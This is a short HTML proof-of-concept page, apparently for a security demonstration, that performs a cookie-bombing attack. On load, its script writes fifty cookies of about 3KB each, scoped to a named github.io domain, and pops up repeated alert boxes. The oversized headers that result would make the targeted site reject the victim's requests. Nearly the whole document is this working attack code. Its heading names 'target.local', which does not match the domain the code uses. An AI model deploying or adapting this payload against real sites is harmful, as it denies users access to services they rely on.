<!DOCTYPE html>
<html>
<head>
    <title>Explicit Domain Target PoC</title>
</head>
<body>
<script>
    const TARGET_DOMAIN = "ihexcoder.github.io"; 
    
    // Create a predictable 3KB text chunk
    const chunk = "A".repeat(3000);
    
    console.log("Starting cookie generation...");
    alert("Cookie Bombing")
    
    // Write 50 cookies, totaling roughly 150KB of header data
    for (let i = 0; i < 50; i++) {
        alert("Cookie Bombing")
        document.cookie = `session_pad_${i}=${chunk}; Domain=${TARGET_DOMAIN}; Path=/; SameSite=Lax`;
    }
    
    console.log("Cookies written. Check the Application tab in DevTools.");
</script>
<h1>Payload deployed to target.local</h1>
</body>
</html>
